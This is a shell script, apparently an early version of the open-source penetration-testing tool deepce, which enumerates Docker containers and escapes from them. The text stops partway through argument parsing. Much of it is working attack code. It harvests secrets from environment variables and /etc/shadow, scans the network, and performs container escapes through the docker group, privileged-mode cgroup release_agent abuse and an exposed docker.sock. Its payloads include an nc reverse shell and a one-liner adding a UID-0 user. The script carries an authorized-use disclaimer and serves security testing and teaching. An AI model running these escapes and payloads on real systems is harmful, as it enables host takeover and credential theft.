#!/bin/sh

# shellcheck disable=SC2034
VERSION="v0.1.0"
ADVISORY="deepce should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission."

###########################################
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
Y="${C}[1;33m"
B="${C}[1;34m"
LG="${C}[1;37m" #LightGray
DG="${C}[1;90m" #DarkGray
NC="${C}[0m"
UNDERLINED="${C}[4m"
EX="${C}[48;5;1m"

banner() {
  if [ "$quiet" ]; then
    return
  fi

  cat <<EOF

$DG                      ##$LG         .
$DG                ## ## ##$LG        ==
$DG             ## ## ## ##$LG       ===
$LG         /"""""""""""""""""\___/ ===
$B    ~~~ $DG{$B~~ ~~~~ ~~~ ~~~~ ~~~ ~$DG /  $LG===-$B ~~~$NC
$DG         \______ X           __/
$DG           \    \         __/
$DG            \____\_______/$NC
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \ $DG  ENUMERATE$NC
   / /_/ /  __/  __/ /_/ / (__/  __/ $DG ESCALATE$NC
   \__,_/\___/\___/ .___/\___/\___/$DG  ESCAPE$NC
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

EOF
}

show_help() {
  cat <<EOF
Usage: ${0##*/} [OPTIONS...]

  -ne,--no-enum          Don't perform enumeration, useful for skipping straight to exploits
  -nn,--no-network       Don't perform any network operations
  -nc,--no-colors        Don't use terminal colors

  --install              Install useful packages before running script, this will maximise enumeration and exploitation potential

  -doc, --delete         Script will delete itself on completion

  ${DG}[Exploits]$NC
  -e, --exploit          Use one of the following exploits (eg. -e SOCK)

    DOCKER               use docker command to create new contains and mount root partition to priv esc
    PRIVILEGED           exploit a container with privileged mode to run commands on the host
    SOCK                 use an exposed docker sock to create a new container and mount root partition to priv esc
    CVE-2019-5746
    CVE-2019-5021

  ${DG}[Payloads & Options]$NC
  -i, --ip               The local host IP address for reverse shells to connect to
  -p, --port             The port to use for bind or reverse shells
  -l, --listen           Automatically create the reverse shell listener

  -s, --shadow           Print the shadow file as the payload

  -cmd, --command        Run a custom command as the payload

  -x, --payload          Run a custom executable as the payload

  --username             Create a new root user
  --password             Password for new root user

  ${DG}[General Options]$NC
  -q, --quiet            Shhhh, be less verbose
  -h, --help             Display this help and exit.

  [Examples]
  $DG# Exploit docker to get a local shell as root$NC
  ./deepce.sh -e DOCKER

  $DG# Exploit an exposed docker sock to get a reverse shell as root on the host$NC
  ./deepce.sh -e SOCK -l -i 192.168.0.23 -p 4444

EOF
}

###########################################
#--------------) Constants (--------------#
###########################################

# Note we use space separated strings for arrays as sh does not support arrays.
PATH_APPS="/app /usr/src/app /usr/src/myapp /home/node/app /go/src/app /var/www/html /usr/local/tomcat /mosquitto /opt/sonarqube /var/lib/ghost /var/jenkins_home /var/lib/rabbitmq /etc/rabbitmq /var/lib/mysql /usr/local/apache2 /etc/nginx /usr/share /usr/local/etc/redis /etc/traefik /var/lib/postgresql /opt/couchbase"
CONFIG_FILES="/usr/local/apache2/conf/httpd.conf /etc/traefik/traefik.toml /etc/traefik/traefik.yml /etc/mysql/conf.d /etc/mysql/my.cnf /etc/rabbitmq/rabbitmq.config"

GREP_SECRETS="pass\|secret\|key"
GREP_SOCK_INFOS="Architecture\|OSType\|Name\|DockerRootDir\|NCPU\|OperatingSystem\|KernelVersion\|ServerVersion"
GREP_SOCK_INFOS_IGNORE="IndexConfig"
GREP_IGNORE_MOUNTS="/ /\|/cgroup\|/var/lib/docker/\|/null \| proc proc \|/dev/console\|docker.sock"

TIP_NETWORK_ENUM="By default containers can communicate with other containers on the same network and the host machine, this can be used to enumerate further"
TIP_WRITABLE_SOCK="The docker sock is writable, we should be able to enumerate docker, create containers and obtain root privs on the host machine
See ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-sock.md${NC}"
TIP_DNS_CONTAINER_NAME="Reverse DNS lookup of container name requires host, dig or nslookup to get the container name"
TIP_DOCKER_GROUP="Users in the docker group can escalate to root on the host by mounting the host partition inside the container and chrooting into it.
deepce.sh -e DOCKER
See ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-group.md${NC}"
TIP_DOCKER_CMD="If we have permission to create new docker containers we can mount the host's root partition and chroot into it and execute commands on the host OS."
TIP_PRIVILEGED_MODE="The container appears to be running in privilege mode, we should be able to access the raw disks and mount the hosts root partition in order to gain code execution.
See ${UNDERLINED}https://stealthcopter.github.io/deepce/guides/docker-privileged.md${NC}"

TIP_CVE_2019_5021="Alpine linux version 3.3.x-3.5.x accidentally allow users to login as root with a blank password, if we have command execution in the container we can become root using su root"
TIP_CVE_2019_13139="Docker versions before 18.09.4 are vulnerable to a command execution vulnerability when parsing URLs"
TIP_CVE_2019_5736="Docker versions before 18.09.2 are vulnerable to a container escape by overwriting the runC binary"

DANGEROUS_GROUPS="docker\|lxd\|root\|sudo\|wheel"
DANGEROUS_CAPABILITIES="cap_sys_admin\|cap_sys_ptrace\|cap_sys_module\|dac_read_search\|dac_override"

CONTAINER_CMDS="docker lxc rkt kubectl podman"
USEFUL_CMDS="curl wget gcc nc netcat ncat jq nslookup host hostname dig python python2 python3 nmap"

###########################################
#---------------) Helpers (---------------#
###########################################

# Convert version numbers into a regular number so we can do simple comparisons (use floats because sh can interpret 0 prefix numbers incorrectly otherwise).
# shellcheck disable=SC2046
# shellcheck disable=SC2183 # word splitting here is on purpose
ver() { printf "%03.0f%03.0f%03.0f" $(echo "$1" | tr '.' ' ' | cut -d '-' -f1); }

###########################################
#--------------) Printing (---------------#
###########################################

printer() {
  # Only print if not empty
  if [ "$2" ]; then
    # Temporarily replace the IFS with null to preserve newline chars
    OLDIFS=$IFS
    IFS=
    printf "%s%s%s\n" "$1" "$2" "$NC"
    # Restore it so we don't break anything else
    IFS=$OLDIFS
  fi
}

printSection() {
  # Print a section like:
  # ========================================( Title here )========================================
  l=94
  if [ "$1" ]; then
    s="( $1 )"
  else
    s="$1"
  fi
  size=${#s}
  no=$((l-size))
  start=$((no/2))
  end=$((no-start))
  printf "%s%${start}s" "$B" | tr " " "="
  printf "%s%s%s" "$GREEN" "$s" "$B"
  printf "%${end}s" | tr " " "="
  printf "%s\n" "$NC"
}

printEx() { printer "$EX" "$1"; }
printFail() { printer "$DG" "$1"; }
printInfo() { printer "$LG" "$1"; }
printError() { printer "$RED" "$1"; }
printSuccess() { printer "$Y" "$1"; }
printQuestion() { printf "%s[+]%s %s %s" "$Y" "$GREEN" "$1" "$NC"; }
printStatus() { printer "$DG" "$1"; }
printYesEx() { printEx Yes; }
printYes() { printSuccess Yes; }
printNo() { printFail No; }
TODO() { printError "${NC}TODO $1"; }
nl() { echo ""; }

printTip() {
  if [ "$quiet" ]; then
    return
  fi
  printer "$DG" "$1" | fold -s -w 95
  nl
}

printResult() {
  printQuestion "$1"
  if [ "$2" ]; then
    printSuccess "$2"
  else
    if [ "$3" ]; then
      printError "$3"
    else
      printNo
    fi
  fi
}

printResultLong() {
  printQuestion "$1"
  if [ "$2" ]; then
    printYes
    printStatus "$2"
  else
    if [ "$3" ]; then
      printError "$3"
    else
      printNo
    fi
  fi
}

printMsg() {
  printQuestion "$1"
  printFail "$2"
}

printInstallAdvice() {
  printError "$1 is required but not installed"
  # TODO: Test install options
  # TODO: Rename some with correct package names
  if [ -x "$(command -v apt)" ]; then
    # Debian based OSes
    # TODO dig / nslookup / host -> dnsutils
    printError "apt install -y $1"
  elif [ -x "$(command -v apk)" ]; then
    # Alpine
    # TODO: dig / nslookup -> bind-tools
    printError "apk add $1"
  elif [ -x "$(command -v yum)" ]; then
    # CentOS / Fedora
    # TODO: dig / nslookup -> bind-utils
    printError "yum install $1"
  elif [ -x "$(command -v apt-get)" ]; then
    # Old Debian
    # TODO dig / nslookup / host -> dnsutils
    printError "apt-get install -y $1"
  fi
  nl
}

installPackages() {
  if ! [ "$install" ]; then
    return
  fi

  if ! [ "$(id -u)" = 0 ]; then
    # TODO: Elevate via sudo
    printError "Need to be root to install packages..."
    return
  fi

  printSection "Installing Packages"
  if [ -x "$(command -v apt)" ]; then
    # Debian based OSes
    printQuestion "Installing Packages ....."

    export DEBIAN_FRONTEND=noninteractive
    if ! [ "$(apt update 2>/dev/null)" ]; then #
        printError "Failed"
        return
    fi

    if apt install --no-install-recommends --force-yes -y dnsutils curl nmap iputils-ping libcap2-bin >/dev/null 2>&1; then
        printSuccess "Success"
    else
        printError "Failed"
    fi

  elif [ -x "$(command -v apk)" ]; then
    # Alpine
    apk add bind-tools curl nmap libcap
  elif [ -x "$(command -v yum)" ]; then
    # CentOS / Fedora
    yum install bind-utils curl nmap libcap
  elif [ -x "$(command -v apt-get)" ]; then
    # Old Debian
    apt-get install -y dnsutils curl nmap inetutils-ping libcap2-bin
  fi
}

unsetColors(){
  RED=""
  GREEN=""
  Y=""
  B=""
  LG=""
  DG=""
  NC=""
  UNDERLINED=""
  EX=""
}

describeColors(){
  # Describe the colors unless they have been unset or we're being quiet
  if [ "$quiet" ] || ! [ "$RED" ]; then
    return
  fi
  printSection "Colors"
  printQuestion "Exploit Test ............"; printEx "Exploitable - Check this out";
  printResult "Basic Test .............." "Positive Result"
  printResult "Another Test ............" "" "Error running check"
  printQuestion "Negative Test ..........."; printNo;
  printResultLong "Multi line test ........." "Command output
spanning multiple lines"
  nl
  printTip "Tips will look like this and often contains links with additional info. You can usually ctrl+click links in modern terminal to open in a browser window
See ${UNDERLINED}https://stealthcopter.github.io/deepce${NC}"
}

###########################################
#---------------) Checks (----------------#
###########################################

containerCheck() {
  # Are we inside docker?
  inContainer=""
  if [ -f "/.dockerenv" ]; then
    inContainer="1"
    containerType="docker"
  fi

  # Additional check in case .dockerenv removed
  if grep "/docker/" /proc/1/cgroup -qa; then
    inContainer="1"
    containerType="docker"
  fi

  #Docker check: cat /proc/1/attr/current

  # Are we inside kubenetes?
  if grep "/kubepod" /proc/1/cgroup -qa; then
    inContainer="1"
    containerType="kubentes"
  fi

  # Are we inside LXC?
  if env | grep "container=lxc" -qa; then
    inContainer="1"
    containerType="lxc"
  fi
  if grep "/lxc/" /proc/1/cgroup -qa; then
    inContainer="1"
    containerType="lxc"
  fi
}

containerType() {
  printResult "Container Platform ......" "$containerType" "Unknown"
}

userCheck() {
  printQuestion "User ...................."
  if [ "$(id -u)" = 0 ]; then
    isUserRoot="1"
    printSuccess "root"
  else
    printSuccess "$(whoami)"
  fi

  printQuestion "Groups .................."
  groups=$(groups| sed "s/\($DANGEROUS_GROUPS\)/${LG}${EX}&${NC}${DG}/g")
  printStatus "$groups" "None"
}

dockerSockCheck() {
  # Is the docker sock exposed
  printQuestion "Docker Sock ............."
  dockerSockPath=""
  if [ -S "/var/run/docker.sock" ]; then
    dockerSockPath="/var/run/docker.sock"
    printYes
  else
    printFail "Not Found"
    # TODO: Search elsewhere for sock?
  fi

  if [ "$dockerSockPath" ]; then

    printInfo "$(ls -lah $dockerSockPath)"
    nl

    # Is docker sock writable
    printQuestion "Sock is writable ........"
    if test -r "$dockerSockPath"; then
      printYesEx
      printTip "$TIP_WRITABLE_SOCK"
    else
      printNo
    fi

    if [ -x "$(command -v curl)" ]; then
      sockInfoCmd="curl -s --unix-socket $dockerSockPath http://localhost/info"
      sockInfoRepsonse="$($sockInfoCmd)"

      printTip "To see full info from the docker sock output run the following"
      printStatus "$sockInfoCmd"
      nl

      # Docker version unknown lets get it from the sock
      if [ -z "$dockerVersion" ]; then
        # IF jq...
        #dockerVersion=`$sockInfoCmd | jq -r '.ServerVersion'`
        dockerVersion=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
      fi

      # Get info from sock
      info=$(echo "$sockInfoRepsonse" | tr ',' '\n' | grep "$GREP_SOCK_INFOS" | grep -v "$GREP_SOCK_INFOS_IGNORE" | tr -d '"')

      printInfo "$info"
    else
      printError "Could not interact with the docker sock, as curl is not installed"
      printInstallAdvice "curl"
    fi
  fi
}

enumerateContainer() {
  printSection "Enumerating Container"
  containerID
  containerName
  containerIPs
  getContainerInformation
  containerCapabilities
  containerServices
  containerPrivileges
  containerExploits
}

containerID() {
  # Get container ID
  containerID="$(cat /etc/hostname)"
  #containerID="$(hostname)"
  #containerID="$(uname -n)"
  # Get container full ID
  printResult "Container ID ............" "$containerID" "Unknown"

  if [ "$containerType" = "docker" ]; then
    containerFullID=$(basename "$(cat /proc/1/cpuset)")
    printResult "Container Full ID ......." "$containerFullID" "Unknown"
  fi
}

containerIPs() {
  sleep 2

  # Get container IP
  if [ -x "$(command -v hostname)" ]; then
    containerIP="$(hostname -I 2>/dev/null || hostname -i)"
  elif [ -x "$(command -v ip)" ]; then
    containerIP="$(ip route get 1 | head -1 | cut -d' ' -f7)" # FIXME: Use sed as fields are inconsistent
  fi

  printResult "Container IP ............" "$containerIP" "Could not find IP"

  # Container DNS
  dnsServers=$(grep "nameserver" /etc/resolv.conf | cut -d' ' -f2 | tr '\n' ' ')
  printResult "DNS Server(s) ..........." "$dnsServers" "Could not find DNS Servers"

  # Host IP
  if [ -x "$(command -v netstat)" ]; then
    hostIP="$(netstat -nr | grep '^0\.0\.0\.0' | awk '{print $2}')"
  elif [ -x "$(command -v ip)" ]; then
    hostIP="$(ip route get 1 | cut -d' ' -f 3)"
  elif [ "$containerIP" ]; then
    # No tools available, just have a guess
    hostIP=$(echo "$containerIP" | cut -d'.' -f 1-3).1
  fi

  printResult "Host IP ................." "$hostIP" "Could not find Host IP"
}

containerTools(){
  for CMD in ${CONTAINER_CMDS}; do
    tools="$tools $(command -v "${CMD}")"
  done
  printResultLong "Container tools ........." "$(echo "$tools" | tr ' ' '\n'| grep -v '^$')" "None"
}

containerName() {
  # Get container name
  # host, dig, nslookup

  if [ "$containerType" = "docker" ]; then
    # Requires containerIP
    if [ "$containerIP" ]; then
        if [ -x "$(command -v host)" ]; then
        containerName=$(host "$containerIP" | rev | cut -d' ' -f1 | rev)
        elif [ -x "$(command -v dig)" ]; then
        containerName=$(dig -x "$containerIP" +noall +answer | grep 'PTR' | rev | cut -f1 | rev)
        elif [ -x "$(command -v nslookup)" ]; then
        containerName=$(nslookup "$containerIP" 2>/dev/null | grep 'name = ' | rev | cut -d' ' -f1 | rev)
        else
        missingTools="1"
        fi
    fi
  else
    containerName=$containerID
  fi

  printQuestion "Container Name .........."
  if [ "$containerName" ]; then
    printSuccess "$containerName"
  else
    printError "Could not get container name through reverse DNS"
    if [ "$missingTools" ]; then
      printTip "$TIP_DNS_CONTAINER_NAME"
      printInstallAdvice "host dig nslookup"
    fi
  fi
}

getContainerInformation() {
  # Enumerate container info

  if [ -x "$(command -v lsb_release)" ]; then
    os="$(lsb_release -i | cut -f2)"
  else
    os="$(uname -o)"
  fi

  kernelVersion=$(uname -r)
  arch=$(uname -m)
  cpuModel=$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d':' -f2| cut -d' ' -f2-)

  printMsg "Operating System ........" "$os"
  printMsg "Kernel .................." "$kernelVersion"
  printMsg "Arch ...................." "$arch"
  printMsg "CPU ....................." "$cpuModel"

  for CMD in ${USEFUL_CMDS}; do
    tools="$tools $(command -v "${CMD}")"
  done

  # shellcheck disable=SC2086 # Double quotes messes up output...
  printResultLong "Useful tools installed .." "$(echo $tools | tr ' ' '\n')"
}

containerCapabilities() {
  printQuestion "Dangerous Capabilities .."
  if [ -x "$(command -v capsh)" ]; then
    if capsh --print| grep -q "$DANGEROUS_CAPABILITIES"; then
        caps=$(capsh --print |grep 'cap_' | sed "s/\($DANGEROUS_CAPABILITIES\)/${LG}${EX}&${NC}${DG}/g")
        printYes
        printStatus "$caps"
    else
        printNo
    fi
  else
    printError "Unknown (capsh not installed)"
  fi
}

containerServices() {
  # SSHD

  printQuestion "SSHD Service ............"

  if ! [ -x "$(command -v ps)" ]; then
    printError "Unknown (ps not installed)"
    return
  fi

  (ps -aux 2>/dev/null || ps -a) | grep -v "grep" | grep -q "sshd"

  # shellcheck disable=SC2181
  if [ $? -eq 0 ]; then
    if [ -f "/etc/ssh/sshd_config" ]; then
      sshPort=$(grep "^Port" /etc/ssh/sshd_config || echo "Port 22" | cut -d' ' -f2)
      printSuccess "Yes (port $sshPort)"
    else
      printSuccess "Yes"
    fi
  else
    printNo
  fi
}

containerPrivileges() {
  printQuestion "Privileged Mode ........."
  if [ -x "$(command -v fdisk)" ]; then
    if [ "$(fdisk -l 2>/dev/null | wc -l)" -gt 0 ]; then
      printYesEx
      printTip "$TIP_PRIVILEGED_MODE"
    else
      printNo
    fi
  else
    printError "Unknown"
  fi
}

containerExploits() {
  # If we are on an alpine linux disto check for CVE–2019–5021
  if [ -f "/etc/alpine-release" ]; then
    alpineVersion=$(cat /etc/alpine-release)
    printQuestion "Alpine Linux Version ...."
    printSuccess "$alpineVersion"
    printQuestion "└── CVE-2019-5021 ......."

    if [ "$(ver "$alpineVersion")" -ge "$(ver 3.3.0)" ] && [ "$(ver "$alpineVersion")" -le "$(ver 3.6.0)" ]; then
      printYesEx
      printTip "$TIP_CVE_2019_5021"
    else
      printNo
    fi
  fi
}

enumerateContainers() {
  printSection "Enumerating Containers"

  if [ "$inContainer" ]; then # If inside a container

    printTip "$TIP_NETWORK_ENUM"

    # Find containers...
    if [ "$dockerCommand" ]; then
        # Enumerate containers using docker
        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
        printMsg "Docker Containers........" "$dockercontainers"
        docker ps -a
    elif [ "$dockerSockPath" ]; then
        # Enumerate containers using sock
        TODO "Enumerate container using sock"
    else
        pingSweep
    fi

    portScan

  else # Not in a container

    if docker ps >/dev/null 2>&1; then # Enumerate docker containers
        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
        dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
        printMsg "Docker Containers........" "$dockercontainers Running, $dockercontainersTotal Total"
        docker ps -a
    fi
    if lxc list >/dev/null 2>&1; then # Enumerate lxc containers
        lxccontainers=$(lxc list | grep -c "| RUNNING |" 2>/dev/null)
        lxccontainersTotal=$(lxc list | grep -c "| CONTAINER |" 2>/dev/null)
        printMsg "LXC Containers..........." "$lxccontainers Running, $lxccontainersTotal Total"
        lxc list
    fi
    if rkt list >/dev/null 2>&1; then # Enumerate rkt containers
        rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
        printMsg "RKT Containers..........." "$rktcontainers Total" # TODO: Test and add total
        rkt list
    fi
  fi
}

pingSweep() {
  if [ "$noNetwork" ]; then
    return
  fi

  if [ "$containerIP" ]; then
    # Enumerate containers the hard way (network enumeration)
    subnet=$(echo "$containerIP" | cut -d'.' -f1-3)

    if [ -x "$(command -v nmap)" ]; then
      # Method 1: nmap
      printQuestion "Attempting ping sweep of $subnet.0/24 (nmap)"
      nl
      nmap -oG - -sP "$subnet.0/24" | grep "Host:"
    elif [ -x "$(command -v ping)" ] && ping -c 1 127.0.0.1 2>/dev/null 1>&2; then
      # Method 2: ping sweep (check ping is executable, and we can run it, sometimes needs root)
      printQuestion "Attempting ping sweep of $containerIP/24 (ping)"
      nl

      pids=""
      # Ping all IPs in range
      set +m
      for addr in $(seq 1 1 10); do
        (ping -c 1 -t 1 "$subnet.$addr" >/dev/null && echo "$subnet.$addr" is Up) & true >/dev/null
        pids="${pids} $!"
      done

      # Wait for all background pids to complete
      for pid in ${pids}; do
        wait "${pid}"
      done
    else
      printError "Could not ping sweep, requires nmap or ping to be executable"
    fi
  else
    printError "Cannot enumerate network without IP address"
  fi
}

portScan() {
  if [ "$noNetwork" ]; then
    return
  fi

  # Scan containers / host
  if [ -x "$(command -v nmap)" ]; then
    # Method 1: nmap
    if [ "$containerIP" ]; then
      printSection "Scanning Host"
      printQuestion "Scanning host $hostIP (nmap)"
      nmap "$hostIP" -p-
    fi
  fi
}

findMountedFolders() {
  # Find information about mount points
  printSection "Enumerating Mounts"

  printQuestion "Docker sock mounted ......."
  if grep -q docker.sock /proc/self/mountinfo; then
    printYesEx
    # Docker sock appears to be mounted, uhoh!
    printTip "$TIP_WRITABLE_SOCK"
    dockerSockPath=$(grep "docker.sock" /proc/self/mountinfo | cut -d' ' -f 5)
  else
    printNo
  fi

  otherMounts=$(grep -v "$GREP_IGNORE_MOUNTS" /proc/self/mountinfo | cut -d' ' -f 4-)

  printQuestion "Other mounts .............."
  if [ "$otherMounts" ]; then
    printYes
    printStatus "$otherMounts"

    # Possible host usernames found: (sed is hard... using a fudge)
    usernames=$(echo "$otherMounts" | sed 's/.*\/home\/\(.*\)/\1/' | cut -d '/' -f 1 | sort | uniq | tr '\n' ' ')
    if [ "$usernames" ]; then
      printResult "Possible host usernames ..." "$usernames"
    fi

    if echo "$otherMounts" | grep -q "ecryptfs"; then
      printResult "Encrypted home directory .." "Detected"
    fi

  else
    printNo
  fi
}

findInterestingFiles() {
  printSection "Interesting Files"

  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Ii "$GREP_SECRETS")
  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Iiv "$GREP_SECRETS")

  printQuestion "Interesting environment variables ..."
  if [ "$interestingVars" ]; then
    printYes
    printSuccess "$interestingVars"
  else
    printNo
  fi

  printStatus "$boringVars"

  # Any common entrypoint files etc?
  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null)
  printResultLong "Any common entrypoint files ........." "$entrypoint"

  # Any files in root dir
  if [ -x "$(command -v find)" ]; then
    interestingFiles=$(find / -maxdepth 1 -type f | grep -v "/.dockerenv\|deepce.sh")
  else
    # shellcheck disable=SC2010
    interestingFiles=$(ls -lah / | grep -v '^d\|^l\|^total\|.dockerenv\|deepce.sh')
  fi

  printResultLong "Interesting files in root ..........." "$interestingFiles"

  # Any secrets in root dir files
  result=$(grep -Iins --exclude="deepce.sh" "$GREP_SECRETS" /*)

  printResultLong "Passwords in common files ..........." "$result"

  # Home Directories
  homeDirs="$(ls -lAh /home)"
  printQuestion "Home directories ...................."

  if echo "$homeDirs" | grep -qv 'total 0'; then
    printStatus "$homeDirs"
  else
    printNo
  fi

  hashes=$(cut -d':' -f2 < /etc/shadow 2>/dev/null | grep -v '^*$\|^!')
  printQuestion "Hashes in shadow file ..............."
  if [ "$hashes" ]; then
    printYes
    printStatus "$hashes"
  elif test -r /etc/shadow; then
    # Cannot check...
    printFail "No permissions"
  else
    printNo
  fi

  # TODO: Check this file /run/secrets/

  printQuestion "Searching for app dirs .............."
  nl
  for p in ${PATH_APPS}; do
    if [ -f "$p" ]; then
      printSuccess "$p"
      printMsg "$(ls -lAh "$p")"
    fi
  done

}

getDockerVersion() {
  printQuestion "Docker Executable ......."
  if [ "$(command -v docker)" ]; then
    dockerCommand="$(command -v docker)"
    dockerVersion="$(docker -v | cut -d',' -f1 | cut -d' ' -f3)"
    printSuccess "$dockerCommand"
    printQuestion "Docker version .........."
    printSuccess "$dockerVersion"

    printQuestion "User in Docker group ...."
    if groups | grep -q '\bdocker\b'; then
      printYesEx
      printTip "$TIP_DOCKER_GROUP"
    else
      printNo
    fi
  else
    printFail "Not Found"
  fi
}

checkDockerVersionExploits() {
  # Check version for known exploits
  printResult "Docker Exploits ........." "$dockerVersion" "Version Unknown"
  if ! [ "$dockerVersion" ]; then
    return
  fi

  printQuestion "CVE–2019–13139 .........."
  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.5)" ]; then
    printYesEx
    printTip "$TIP_CVE_2019_13139"
  else
    printNo
  fi

  printQuestion "CVE–2019–5736 ..........."
  if [ "$(ver "$dockerVersion")" -lt "$(ver 18.9.3)" ]; then
    printYesEx
    printTip "$TIP_CVE_2019_5736"
  else
    printNo
  fi
}

###########################################
#--------------) Exploits (---------------#
###########################################

prepareExploit() {
  # Shared method that takes the user input and converts it into a cmd to be used for exploitation
  # Current available PAYLOADS are:
  # - shadow
  # - local shell
  # - custom command
  # - new root user

  printMsg "Preparing Exploit" " "

  if [ "$shadow" ]; then

    # Show shadow password hashes
    printMsg "Exploit Type ............." "Print Shadow"
    printMsg "Clean up ................." "Automatic on container exit"

    cmd="cat /etc/shadow"

  elif [ "$username" ]; then
    # New root user

    if ! [ "$username" ]; then
      printError "username missing"
      exit 1
    fi

    if ! [ "$password" ]; then
      printError "password missing"
      exit 1
    fi

    printMsg "Exploit Type ............." "Add new root user"
    printMsg "Username ................." "$username"
    printMsg "Password ................." "$password"
    printMsg "Clean up ................." "Manual, remember to delete user after exploitation!"
    # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
    cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"

  elif [ "$command" ]; then

    # Custom payload (run a command)
    printMsg "Exploit Type ............." "Custom Command"
    printMsg "Custom Command ..........." "$command"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="$command"

  elif [ "$ip" ]; then
    # Reverse shell

    if ! [ "$port" ]; then
      printError "port missing"
      exit 1
    fi

    printMsg "Shell Type ....... " "Reverse TCP"
    printMsg "Create listener .. " "No"
    printMsg "Host ............. " "$ip"
    printMsg "Port ............. " "$port"
    cmd="/bin/sh -c nc $ip $port -e /bin/sh"

    if [ "$listen" ]; then
      # Enable job control
      set -m
      # Create listener
      nc -lvnp "$port" &
      # PID_NC=$!
      bg
    fi

  else
    # TODO: Disable on sock / privileged as we dont have interactive
    printMsg "Exploit Type ............." "Local Shell"
    printMsg "Create shell ............." "Yes"
    printMsg "Clean up ................." "Automatic on container exit"
    cmd="/bin/sh"
  fi

  if ! [ "$cmd" ]; then
    printError "Nothing to do, if trying to launch a shell add -cmd bash"
    exit 1
  fi
}

exploitDocker() {
  printSection "Exploiting Docker"
  printTip "$TIP_DOCKER_CMD"

  if ! [ -x "$(command -v docker)" ]; then
    printError "Docker command not found, but required for this exploit"
    exit
  fi

  prepareExploit
  printQuestion "Exploiting"
  nl
  # shellcheck disable=SC2086 # Word splitting is expected and allowed here
  docker run -v /:/mnt --rm -it alpine chroot /mnt $cmd

  printQuestion "Exploit complete ...."
  if [ $? ]; then
    printSuccess "Success"
  else
    printError 'Error'
  fi
}

exploitPrivileged() {

# This is disabled because if no-enum is set then we dont know if we're in a container..
#  if ! [ "$inContainer" ]; then
#    printError "Not in container"
#    return
#  fi

  printSection "Exploiting Privileged"
  printTip "$TIP_PRIVILEGED_MODE"
  prepareExploit

  # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
  # shellcheck disable=SC2012 # Not using find as it may not be available
  d=$(dirname "$(ls -x /s*/fs/c*/*/r* | head -n1)")
  if [ -S "$d" ]; then
    printError "Error: exploit failed (docker too old?)"
    return
  fi
  mkdir -p "$d/w"
  echo 1 >"$d/w/notify_on_release"
  t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
  touch /o
  echo "$t/c" >"$d/release_agent"
  printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
  chmod +x /c
  sh -c "echo 0 >$d/w/cgroup.procs"
  sleep 1
  cat /o
  rm /c /o
}

exploitDockerSock() {
  printSection "Exploiting Sock"
  printTip "$TIP_DOCKER_SOCK"

  if ! [ -x "$(command -v curl)" ]; then
    printInstallAdvice "curl"
    exit
  fi

  if ! [ -S "$dockerSockPath" ]; then
    printError "Docker sock not found, but required for this exploit"
    exit
  fi

  prepareExploit

  nl

  # Create docker container using the docker sock
  payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d "{\"Image\":\"alpine\",\"cmd\":$payload, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-Type: application/json' http://localhost/containers/create)

  if ! [ $? ]; then
    printError 'Something went wrong'
    echo "$response"
    return
  fi

  revShellContainerID=$(echo "$response" | cut -d'"' -f4)
  printQuestion "Creating container ....."
  printSuccess "$revShellContainerID"

  startCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start"
  logsCmd="curl -s --unix-socket /var/run/docker.sock \"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\" --output -"
  deleteCmd="curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/stop"
  removeCmd="curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID"

  printQuestion "If the shell dies you can restart your listener and run the start command to fire it again"
  nl
  printStatus "Start Command: $startCmd"
  printStatus "Logs Command: $logsCmd"

  printQuestion "Once complete remember to tidy up by stopping and removing your container with following commands"
  nl

  printStatus "Stop Command: $deleteCmd"
  printStatus "Remove Command: $removeCmd"

  # FIXME: Must be a better way of doing this...
  response=$(eval "$startCmd")

  printQuestion "Starting container ....."
  if [ $? ]; then
    printSuccess "Success"
  else
    printError 'Something went wrong...'
  fi

  delay=2

  printMsg "Sleeping for ..........." "${delay}s"

  sleep $delay

  response=$(eval "$logsCmd")

  printQuestion "Fetching logs .........."
  if [ $? ]; then
    printSuccess "Success"
    printStatus "$response"
  else
    printError 'Something went wrong...'
  fi

  printQuestion "Exploit completed ....."
  if [ "$listen" ]; then
    # Create listener
    printSuccess 'Switching to listener'
    fg
  else
    printSuccess ':)'
  fi

  # TODO: Switch to listener if wanted
  # TODO: Tidy up command
}

###########################################
#--------------) Arg Parse (--------------#
###########################################

while [ $# -gt 0 ]; do
  key="$1"
  case $key in
  -h | --help)
    show_help
    exit 0
    ;;
  -ne | --no-enumeration | --no-enum | --no-enumerate)
    skipEnum="1"
    shift
    ;;
  -nn | --no-network | --no-net)
